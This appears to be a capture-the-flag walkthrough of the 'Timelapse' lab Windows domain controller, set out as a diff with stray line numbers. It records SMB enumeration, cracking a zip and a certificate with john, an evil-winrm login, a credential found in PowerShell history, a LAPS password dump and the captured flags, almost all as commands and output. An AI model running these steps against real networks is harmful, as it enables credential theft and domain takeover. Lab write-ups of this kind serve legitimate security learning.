@@ -1,18 +1,147 @@
+
 10.10.11.152 ttl 127 > windows
-
-
+2
+​
+3
+​
+4
 PORT    STATE SERVICE       VERSION
+5
 53/tcp  open  domain        Simple DNS Plus
+6
 135/tcp open  msrpc         Microsoft Windows RPC
+7
 139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
+8
 445/tcp open  microsoft-ds?
+9
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
+10
+​
+11
 Host script results:
+12
 |_clock-skew: 6h19m14s
+13
 | smb2-time: 
+14
 |   date: 2022-05-03T04:27:05
+15
 |_  start_date: N/A
+16
 | smb2-security-mode: 
+17
 |   3.1.1: 
+18
 |_    Message signing enabled and required
+smbclient -L 10.10.11.152
+Enter WORKGROUP\kyra's password:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share
+        Shares          Disk    
+        SYSVOL          Disk      Logon server share
+
+smbclient //10.10.11.152/Shares
+Enter WORKGROUP\kyra's password:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Oct 25 17:39:15 2021
+  ..                                  D        0  Mon Oct 25 17:39:15 2021
+  Dev                                 D        0  Mon Oct 25 21:40:06 2021
+  HelpDesk                            D        0  Mon Oct 25 17:48:42 2021
+
+                6367231 blocks of size 4096. 1655958 blocks available
+smb: \> cd Dev
+smb: \Dev\> ls
+  .                                   D        0  Mon Oct 25 21:40:06 2021
+  ..                                  D        0  Mon Oct 25 21:40:06 2021
+  winrm_backup.zip                    A     2611  Mon Oct 25 17:46:42 2021
+
+
+smb: \Dev\> mget winrm_backup.zip
+
+zip2john winrm_backup.zip > winrm_hash
+ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
+
+
+john winrm_hash -w=/usr/share/wordlists/rockyou.txt
+
+john --show winrm_hash
+winrm_backup.zip/legacyy_dev_auth.pfx:supremelegacy:legacyy_dev_auth.pfx:winrm_backup.zip::winrm_backup.zip
+
+1 password hash cracked, 0 left
+
+
+unzip winrrm_backup.zip
+password: supremelegacy
+
+
+
+get > legacyy_dev_auth.pfx
+
+python3 pfx2john.py ../data/legacyy_dev_auth.pfx > pfx_hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt  pfx_hash
+password: thuglegacy
+
+
+
+$ll | awk '{print $9}'
+
+legacyy_dev_auth.pfx
+private-key.key
+public-certificate.cer
+winrm_backup.zip
+winrm_hash
+
+evil-winrm -i 10.10.11.152 -p -u -S -c public-certificate.cer -k private-key.key
+
+
+*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
+bdb063d9fa9005e8d542f5417ea34ee2
+
+
+Evil-WinRM* PS C:\Users\legacyy\Desktop> upload /home/$USER/Desktop/Github/winPEASx64.exe
+Info: Uploading /home/$USER/Desktop/Github/winPEASx64.exe to C:\Users\legacyy\Desktop\winPEASx64.exe
+
+
+Data: 2581160 bytes of 2581160 bytes copied
+
+Info: Upload successful!
+
+
+Powershell History
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+*Evil-WinRM* PS C:\> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+decrypt PSCredentials
+wget https://raw.githubusercontent.com/n00py/LAPSDumper/main/laps.py
+./laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+DC01$:R911mAYI9[.sJj;6R#Dvt3p;
+
+./laps.py -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb
+DC01$:(hy40+3fOpjqjL18q5+G}0xt
+evil-winrm -i 10.10.11.152 -u Administrator -p '(hy40+3fOpjqjL18q5+G}0xt' -S -P 5986
+
+
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+ba2915e5009ab33346bc67654bddec8a
+
